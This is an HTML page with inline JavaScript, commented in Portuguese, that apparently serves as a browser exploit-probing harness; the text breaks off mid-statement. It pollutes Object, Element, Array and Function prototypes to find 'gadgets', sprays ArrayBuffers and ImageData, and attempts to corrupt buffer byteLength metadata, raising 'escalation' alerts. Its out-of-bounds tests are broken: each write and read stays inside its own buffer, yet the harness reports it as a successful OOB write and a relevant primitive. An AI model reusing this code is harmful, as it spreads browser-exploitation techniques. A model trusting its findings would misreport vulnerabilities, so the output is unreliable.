<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Script Isolado - Parte 2 Revisada (Canvas v18 Debug)</title>
    <style>
        /* Estilos CSS Essenciais para Parte 2 */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output-canvas { background: #222; border: 1px solid #444; padding: 10px; height: 75vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
        #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; background-color: #333; cursor: default; }
        #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Script Isolado - Parte 2 Revisada (Canvas v18 Debug)</h1>
    <section>
        <h2>Teste de Canvas Focado (v18)</h2>
        <p>Foco: PP Avançado++, Gadget Impact, OOB Read++(Heuristics), OOB Write->Metadata(Detailed Log), Complex Canvas, WebGL(N/A), FileSystem(N/A), WebGPU(N/A), Canvas Interact.</p>
        <canvas id="interactive-canvas" width="350" height="200"></canvas> <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste Canvas v18</button>
        <div id="output-canvas"></div>
    </section>

    <script>
        // --- Script 2 Revisado: Canvas (v18 Debug) ---

        // --- Variáveis Globais ---
        const SHORT_PAUSE_CANVAS = 50;
        const MEDIUM_PAUSE_CANVAS = 400;
        let canvasClickListener = null; let canvasMoveListener = null; let currentHoverTarget = null;
        const interactiveAreas = [ { id: 'rect-log', x: 10, y: 10, w: 80, h: 30, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Click' }, { id: 'rect-link', x: 100, y: 10, w: 80, h: 30, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' }, { id: 'rect-rerun', x: 190, y: 10, w: 100, h: 30, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' } ];
        const imgSquareSize = 30; const imgSquareSpacing = 6; const imgSquares = []; const imgSquaresStartY = 55;
        let leakedValueFromOOB = null; // Viria do Script 1
        let currentLeakData = { text: "Leak(S1): N/A", color: "#AAAAAA" };
        let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null; let glContext = null; let isWebGL2 = false;
        let gpuAdapter = null; let gpuDevice = null;
        let ppGadgetsDetected = {};

        // --- Funções Helper ---
        const IMPORTANT_LOG_TYPES_S2 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
        const logCanvas = (message, type = 'info', funcName = '') => { let keepLog = IMPORTANT_LOG_TYPES_S2.includes(type); if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('n/a') || lowerMsg.includes('não suportad') || lowerMsg.includes('não disponível') || lowerMsg.includes('fail:') || lowerMsg.includes('não afetou') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('escrita oob falhou/bloqueada') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('ok') || lowerMsg.includes('aberto') || lowerMsg.includes('concluído') || lowerMsg.includes('restaurado') || lowerMsg.includes('limpeza') || lowerMsg.includes('pulado') || lowerMsg.includes('resolvido') || lowerMsg.includes('sem erro') || lowerMsg.includes('finalizado')) { keepLog = true; } } if (!keepLog && type === 'error' && (String(message).includes('Element.innerHTML setter') || String(message).includes('webgl') || String(message).includes('gpu') || String(message).includes('file system') || String(message).includes('indexeddb') || String(message).includes('fatal') || String(message).includes('critical'))) { keepLog = true; } if (!keepLog && funcName === 'CanvasClick') { keepLog = true; } if (!keepLog) return; if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas'); if (!outputDivCanvas) return; const logPrefix = `[CANVAS-${type.toUpperCase()}]`; const funcPrefix = funcName ? `[${funcName}] ` : ''; const logMsg = `${logPrefix} ${funcPrefix}${message}`; console.log(logMsg); try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sM = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(outputDivCanvas.innerHTML.length > 900000){ outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - 450000); outputDivCanvas.innerHTML = `<span>[Log S2 Truncado...]</span>\n` + outputDivCanvas.innerHTML; } outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${funcPrefix}${sM}\n</span>`; outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight; } catch(e) { console.error("logCanvas ERRO:", e); if (outputDivCanvas) outputDivCanvas.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; } };
        const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
        const toHexCanvas = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let n = Number(val); if (bits <= 32) { n >>>= 0; } const p = Math.ceil(bits / 4); return '0x' + n.toString(16).toUpperCase().padStart(p, '0'); };
        const isPotentialPointer64_S2 = (high, low, address) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0xCCCCCCCC && low === 0xCCCCCCCC) return false; if (high === 0xDDDDDDDD && low === 0xDDDDDDDD) return false; if (high === 0 && low < 0x10000) return false; if (high === 0 || high === 0xFFFFFFFF) { if(low > 0x100000) {} else { return false; } } return true; };
        const isPotentialData32_S2 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE || val === 0xCCCCCCCC || val === 0xDDDDDDDD) return false; if (val < 0x100) return false; return true; };
        const drawInteractiveAreas = () => { /* ...código inalterado... */ if (!ctx) return; try { interactiveAreas.forEach(a => { ctx.fillStyle = (currentHoverTarget === a.id)?a.hoverColor:a.color; ctx.fillRect(a.x, a.y, a.w, a.h); ctx.fillStyle="#FFF"; ctx.font="bold 12px mono"; ctx.textAlign="center"; ctx.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 4); }); ctx.textAlign="start"; } catch(e) { logCanvas(`Erro drawAreas: ${e.message}`, 'error', 'drawInteractiveAreas'); }};
        const drawImageSquares = () => { /* ...código v18 inalterado... */ if (!ctx) return; try { imgSquares.forEach(sq => { ctx.fillStyle = sq.hover ? '#FFFF88' : sq.color; ctx.fillRect(sq.x, sq.y, sq.size, sq.size); ctx.strokeStyle = '#AAA'; ctx.lineWidth = 1; ctx.strokeRect(sq.x, sq.y, sq.size, sq.size); if (sq.text) { ctx.fillStyle = "#FFF"; ctx.font = `bold ${imgSquareSize < 40 ? '9' : '11'}px mono`; ctx.textAlign = "center"; ctx.textBaseline = "middle"; ctx.fillText(sq.text, sq.x + sq.size / 2, sq.y + sq.size / 2); } if (sq.url) { ctx.fillStyle = "#6cf"; ctx.font = `bold ${imgSquareSize < 40 ? '8' : '10'}px mono`; ctx.fillText("LINK", sq.x + sq.size / 2, sq.y + sq.size - (imgSquareSize < 40 ? 6: 8)); } }); ctx.textAlign = "start"; ctx.textBaseline = "alphabetic"; } catch(e) { logCanvas(`Erro drawSquares: ${e.message}`, 'error', 'drawImageSquares'); }};
        const redrawAll = () => { /* ...código v18 inalterado... */ if (!ctx || !canvasElement) return; try { ctx.save(); ctx.clearRect(0, 0, canvasElement.width, canvasElement.height); ctx.fillStyle = "#334"; ctx.fillRect(0, 0, canvasElement.width, canvasElement.height); drawInteractiveAreas(); drawImageSquares(); ctx.fillStyle = currentLeakData.color; ctx.font = "12px mono"; ctx.textAlign = "start"; ctx.fillText(currentLeakData.text, 10, canvasElement.height - 5); ctx.restore(); } catch(e) { logCanvas(`Erro redrawAll: ${e.message}`, 'error', 'redrawAll'); }};

        // --- Testes Script 2 (v18) ---
        const testWebGLCheck = async () => { /* ...código v18 inalterado... */ const FNAME = 'testWebGLCheck'; logCanvas("--- Teste: Verificação WebGL ---",'test', FNAME); glContext=null; isWebGL2=false; try { glContext=canvasElement.getContext('webgl')||canvasElement.getContext('experimental-webgl'); if(glContext){ const glVersion = glContext.getParameter(glContext.VERSION); logCanvas(`WebGL OK! V:${glVersion.substring(0,30)}`, 'good', FNAME); try{ let gl2=canvasElement.getContext('webgl2'); if(gl2){ const gl2Version = gl2.getParameter(gl2.VERSION); logCanvas(`WebGL2 OK! V:${gl2Version.substring(0,30)}`, 'good', FNAME); isWebGL2=true; } else { logCanvas("WebGL2 não disponível.", 'good', FNAME); } }catch(e2){ logCanvas("WebGL2 check erro.", 'warn', FNAME); } }else{ logCanvas('WebGL N/A.', 'good', FNAME); } }catch(e){ logCanvas(`Erro WebGL check: ${e.message}`, 'error', FNAME); console.error(e); glContext=null; } logCanvas(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContext}, WebGL2: ${isWebGL2}) ---`, 'test', FNAME); await PAUSE(); };
        const testAdvancedPP = async () => { /* ...código v18 inalterado... */ ppGadgetsDetected = {}; const FNAME = 'testAdvancedPP'; logCanvas("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} } ]; const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; let gadgetMessages = []; for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { logCanvas(`-> VULN: Herança PP '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){} if (gadgetMsg) { logCanvas(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); const gadgetKey = prop; ppGadgetsDetected[gadgetKey] = true; gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'cookie'].includes(prop)) { logCanvas(` ---> *** ALERTA: Gadget PP perigoso '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { logCanvas(`-> FAIL: Herança '__proto__' N/A (Esperado).`, 'good', FNAME); } } } catch (e) { logCanvas(`Erro poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { if (wasDefined) { targetProto[prop] = originalValue; } else { delete targetProto[prop]; } } catch (e) {} } await PAUSE(20); } logCanvas(`--- Teste PP Avançado Concluído (${successCount} OK, ${gadgetCount} gadgets) ---`, 'test', FNAME); if (gadgetCount > 0) { logCanvas(`Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME); } await PAUSE(); };
        const testPPGadgetImpact = async () => { /* ...código v18 inalterado... */ const FNAME = 'testPPGadgetImpact'; logCanvas("--- Iniciando Teste: Impacto Gadgets PP ---", 'test', FNAME); let impactConfirms = 0; let impactFailures = 0; const checkImpact = (gadgetName, testFunc, expectedErrorType = TypeError) => { if (!ppGadgetsDetected[gadgetName]) { logCanvas(` -> Gadget '${gadgetName}' N/A, pulando check impacto.`, 'warn', FNAME); return; } logCanvas(` -> Verificando impacto '${gadgetName}'...`, 'info', FNAME); try { testFunc(); logCanvas(` -> FALHA Impacto: '${gadgetName}' não causou erro!`, 'error', FNAME); impactFailures++; } catch (e) { if (e instanceof expectedErrorType) { logCanvas(` -> Impacto CONFIRMADO: '${gadgetName}' causou ${expectedErrorType.name}! (${e.message.substring(0,50)}...)`, 'vuln', FNAME); impactConfirms++; } else { logCanvas(` -> ERRO Inesperado: '${gadgetName}' erro ${e.name}: ${e.message.substring(0,50)}...`, 'error', FNAME); impactFailures++; } } }; await PAUSE(SHORT_PAUSE_CANVAS); checkImpact('map', () => [1, 2].map(x => x * 2)); await PAUSE(SHORT_PAUSE_CANVAS); checkImpact('filter', () => [1, 2].filter(x => x > 1)); await PAUSE(SHORT_PAUSE_CANVAS); checkImpact('forEach', () => [1, 2].forEach(x => console.log(x))); await PAUSE(SHORT_PAUSE_CANVAS); checkImpact('call', () => function f() {}.call(null)); await PAUSE(SHORT_PAUSE_CANVAS); checkImpact('apply', () => function f() {}.apply(null)); await PAUSE(SHORT_PAUSE_CANVAS); checkImpact('appendChild', () => document.createElement('div').appendChild(document.createElement('span'))); await PAUSE(SHORT_PAUSE_CANVAS); try { const testDiv = document.createElement('div'); checkImpact('addEventListener', () => testDiv.addEventListener('click', () => {})); } catch(e) { logCanvas(`Erro criar elem teste addEventListener: ${e.message}`, 'error', FNAME); impactFailures++; } logCanvas(`--- Teste Impacto Gadgets PP Concluído (Confirmados: ${impactConfirms}, Falhas/N/A: ${impactFailures + (Object.keys(ppGadgetsDetected).length - impactConfirms - impactFailures)}) ---`, 'test', FNAME); await PAUSE(); };
        const testOOBReadEnhanced = async () => { /* ...código v18 inalterado... */ const FNAME = 'testOOBReadEnhanced'; logCanvas("--- Teste: OOB Read Enhanced Scan (Heuristics v18) ---",'test', FNAME); const bufferSize=64; const readRangeStart=-256; const readRangeEnd=bufferSize+256; const allocationSize = bufferSize + 1024; const baseOffsetInBuffer = 512; let potentialLeakFoundCount=0; const foundPointers = []; try { const buffer=new ArrayBuffer(allocationSize); const dataView=new DataView(buffer); for(let i=0; i<buffer.byteLength; i+=4){ dataView.setUint32(i, 0xCCCCCCCC, true); } logCanvas(`Iniciando scan OOB de ${readRangeStart} a ${readRangeEnd} (relativo @ ${baseOffsetInBuffer})`, 'info', FNAME); await PAUSE(SHORT_PAUSE_CANVAS); for(let readOffset=readRangeStart; readOffset<readRangeEnd; readOffset+=8){ const readTargetAddress=baseOffsetInBuffer+readOffset; const relOffsetStr = `@${readOffset} (abs 0x${readTargetAddress.toString(16)})`; if(readTargetAddress>=0 && readTargetAddress+8 <= buffer.byteLength){ try{ const low=dataView.getUint32(readTargetAddress,true); const high=dataView.getUint32(readTargetAddress+4,true); if (low === 0xCCCCCCCC && high === 0xCCCCCCCC) continue; if(isPotentialPointer64_S2(high, low, readTargetAddress)){ const valueStr=`H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`; logCanvas(` -> PTR? U64 ${relOffsetStr}: ${valueStr}`, 'ptr', FNAME); potentialLeakFoundCount++; const leakInfo = {offset:readOffset, type:'U64', high, low, hex:valueStr}; foundPointers.push(leakInfo); logCanvas(` ---> Potencial leak ponteiro U64. Analisar.`, 'leak', FNAME); } else { if (isPotentialData32_S2(low)) { logCanvas(` -> Data? U32 ${relOffsetStr}: L=${toHexCanvas(low,32)}`, 'info', FNAME); } if (isPotentialData32_S2(high)) { logCanvas(` -> Data? U32 ${relOffsetStr}+4: H=${toHexCanvas(high,32)}`, 'info', FNAME); } } } catch(e){} } if(readOffset % 128 === 0) await PAUSE(1); } } catch(e){ logCanvas(`Erro fatal OOB Read Scan: ${e.message}`,'error', FNAME); console.error(e); } finally { logCanvas(`--- Teste OOB Read Scan Concluído (${potentialLeakFoundCount} leaks potenciais ptr64) ---`,'test', FNAME); if(foundPointers.length === 0){ logCanvas("Nenhum leak potencial ptr64 (heurística) encontrado.", 'good', FNAME); } else { logCanvas(`Leaks potenciais U64: ${foundPointers.length}. Verificar logs 'ptr'/'leak'.`, 'warn', FNAME); console.log("Potenciais Leaks (OOB Read Enhanced v18):", foundPointers); } } await PAUSE(); return foundPointers; };
        const testOOBWriteMetadata = async () => { /* ...código v18 inalterado com logs detalhados... */ const FNAME = 'testOOBWriteMetadata'; logCanvas("--- Teste: OOB Write -> Metadata (v18 Detailed Log) ---",'test', FNAME); const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE; const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false; const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128; let foundOffset=-1; let finalResultLog = `AVISO: Escrita OOB (${writeSuccessCount}x) OK, nenhuma corrupção byteLength detectada.`; try{ controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME); return; } logCanvas(`Buffers alvo: ${sprayCount} x ${targetBufferSize} bytes.`, 'info', FNAME); for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}} await PAUSE(SHORT_PAUSE_CANVAS); const metadataOffsetsToTry=[-16, -12, -8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40]; logCanvas(`Testando ${metadataOffsetsToTry.length} offsets OOB: [${metadataOffsetsToTry.join(', ')}]`, 'info', FNAME); for(const tryOffset of metadataOffsetsToTry){ const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset; const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`; logCanvas(`-- Tentando Offset ${tryOffset} --`, 'subtest', FNAME); let currentWriteOK=false; try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ logCanvas(` -> Escrevendo ${toHexCanvas(targetValue)} em ${relOffsetStr}...`, 'info', FNAME); dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; logCanvas(`  -> Escrita OOB U32 ${relOffsetStr} OK.`, 'good', FNAME); } else { logCanvas(` -> Offset OOB ${relOffsetStr} fora limites.`, 'warn', FNAME); } }catch(e){ logCanvas(` -> Escrita OOB U32 falhou ${relOffsetStr}: ${e.message}`, 'good', FNAME); } if(currentWriteOK){ logCanvas(` -> Verificando ${targetBuffers.length} buffers alvo...`, 'info', FNAME); await PAUSE(10); for(let j=0; j<targetBuffers.length; j++){ if (corruptionSuccess) break; try { if (!targetBuffers[j]) continue; const lenBefore = targetBuffers[j].byteLength; if(targetBuffers[j].byteLength === targetValue){ logCanvas(`---> VULN: Buffer Alvo ${j} byteLength CORROMPIDO para ${toHexCanvas(targetValue)}! Escrita OOB ${relOffsetStr} FUNCIONOU! <---`, 'critical', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (Corrupção Metadados OOB Write -> R/W Poderoso) ***`, 'escalation', FNAME); corruptionSuccess=true; foundOffset=tryOffset; finalResultLog = `SUCESSO! byteLength corrompido offset ctrlEnd+${foundOffset}.`; try{ const corruptedView=new DataView(targetBuffers[j]); const readOOBAddr = targetBufferSize + 4; const readOOBValue = corruptedView.getUint32(readOOBAddr, true); logCanvas(`  -> Leitura OOB AB ${j} corrompido @ ${readOOBAddr}: ${toHexCanvas(readOOBValue)}`, 'leak', FNAME); logCanvas(` ---> *** ALERTA: Leitura OOB confirmada! ***`, 'escalation', FNAME); } catch(eRead){ logCanvas(`  -> Erro leitura OOB AB ${j} corrompido: ${eRead.message}`, 'warn', FNAME); } break; } } catch(eCheck) { logCanvas(`Erro verificar buffer ${j} (Offset ${tryOffset}): ${eCheck.message}`, 'error', FNAME); logCanvas(` ---> AVISO: Erro acessar buffer ${j} PODE indicar corrupção!`, 'warn', FNAME); } } try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } }catch(eRestore){} } if(corruptionSuccess) break; await PAUSE(15); } if (!corruptionSuccess && writeSuccessCount === 0) { finalResultLog = `Escrita OOB falhou/bloqueada todos offsets.`; logCanvas(finalResultLog, 'good', FNAME); } else { logCanvas(finalResultLog, corruptionSuccess ? 'vuln' : 'warn', FNAME); } logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME); await PAUSE(); };
        const testComplexCanvas = async () => { /* ...código v18 inalterado... */ const FNAME = 'testComplexCanvas'; logCanvas("--- Iniciando Teste: Canvas Operações Complexas ---", 'test', FNAME); if (!ctx) { logCanvas("Ctx 2D N/A, pulando.", 'warn', FNAME); logCanvas("--- Teste Canvas Complexo Concluído (Pulado) ---", 'test', FNAME); return; } try { const width = canvasElement.width; const height = canvasElement.height; const centerX = width / 2; const centerY = height / 2; logCanvas("Desenhando Path2D...", 'info', FNAME); ctx.save(); ctx.fillStyle = "rgba(255, 0, 255, 0.5)"; const path = new Path2D(); path.moveTo(centerX, centerY - 50); path.quadraticCurveTo(centerX + 100, centerY, centerX, centerY + 50); path.quadraticCurveTo(centerX - 100, centerY, centerX, centerY - 50); path.closePath(); ctx.fill(path); ctx.restore(); logCanvas("Path2D OK.", 'good', FNAME); await PAUSE(MEDIUM_PAUSE_CANVAS); logCanvas("Aplicando filtro blur...", 'info', FNAME); try { if ('filter' in ctx) { ctx.save(); ctx.filter = 'blur(3px) saturate(50%)'; ctx.fillStyle = "rgba(0, 255, 255, 0.5)"; ctx.fillRect(20, 50, 100, 100); ctx.filter = 'none'; ctx.restore(); logCanvas("Filtro aplicado OK.", 'good', FNAME); } else { logCanvas("ctx.filter não suportado.", 'warn', FNAME); } } catch (eFilter) { logCanvas(`Erro filtro: ${eFilter.message}`, 'error', FNAME); } await PAUSE(MEDIUM_PAUSE_CANVAS); logCanvas("Desenhando gradiente...", 'info', FNAME); ctx.save(); const gradient = ctx.createRadialGradient(width - 50, height - 50, 5, width - 50, height - 50, 50); gradient.addColorStop(0, 'red'); gradient.addColorStop(1, 'blue'); ctx.fillStyle = gradient; ctx.fillRect(width - 100, height - 100, 100, 100); ctx.restore(); logCanvas("Gradiente OK.", 'good', FNAME); await PAUSE(MEDIUM_PAUSE_CANVAS); redrawAll(); } catch (e) { logCanvas(`Erro GERAL Canvas Complexo: ${e.message}`, 'error', FNAME); console.error("Complex Canvas Error:", e); } finally { logCanvas("--- Teste Canvas Complexo Concluído ---", 'test', FNAME); } await PAUSE(); };
        const testOOBWriteToImageDataCheck = async () => { /* ...código v18 inalterado... */ const FNAME = 'testOOBWriteToImageDataCheck'; logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test', FNAME); const spraySize=30; const imgDataWidth=10; const imgDataHeight=10; const bufferOOBSize=64; const writeValue1=0x42424242; const writeValue2=0x43434343; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; const sprayedImagesData = []; let bufferOOB=null; let dv=null; let oobWritePerformed = false; let potentialCorruptionDetected = false; let patternMatched = false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC); }catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return; } const totalPixels = imgDataWidth * imgDataHeight; const initialByteArray = new Uint8ClampedArray(totalPixels * 4); for (let j = 0; j < initialByteArray.length; j++) { initialByteArray[j] = 255; } for(let i=0; i<spraySize; i++){ try{ let imgData = new ImageData(initialByteArray, imgDataWidth, imgDataHeight); sprayedImagesData.push(imgData); }catch(e){ break; } } await PAUSE(); const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (OOB Write) ***`, 'escalation', FNAME); oobWritePerformed = true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora buffer ctrl.`, 'error', FNAME); } }catch(e){ logCanvas(`Escrita OOB U32x2 falhou @ ${relOffsetStr}: ${e.message}`, 'good', FNAME); } await PAUSE(); if(!ctx){ logCanvas("Ctx 2D N/A.", 'warn', FNAME); return; } ctx.fillStyle="#111"; ctx.fillRect(0, 50, canvasElement.width, canvasElement.height - 80); const cols = Math.floor((canvasElement.width - 10) / (imgDataWidth + 1)); const startY = 60; for(let i=0; i<sprayedImagesData.length; i++){ const gridX = 10 + (i % cols) * (imgDataWidth + 1); const gridY = startY + Math.floor(i / cols) * (imgDataHeight + 1); if (gridY + imgDataHeight > canvasElement.height - 15) { continue; } try{ const currentImageData = sprayedImagesData[i]; if (!currentImageData) continue; ctx.putImageData(currentImageData, gridX, gridY); const readbackImageData = ctx.getImageData(gridX, gridY, imgDataWidth, imgDataHeight); const readbackData = readbackImageData.data; for(let k=0; k < readbackData.length; k += 4){ const r = readbackData[k]; const g = readbackData[k+1]; const b = readbackData[k+2]; const a = readbackData[k+3]; if(r !== 255 || g !== 255 || b !== 255 || a !== 255){ const pixelIndex = k / 4; logCanvas(`---> CORRUPÇÃO DETECTADA ImgData ${i} @ px ${pixelIndex}! 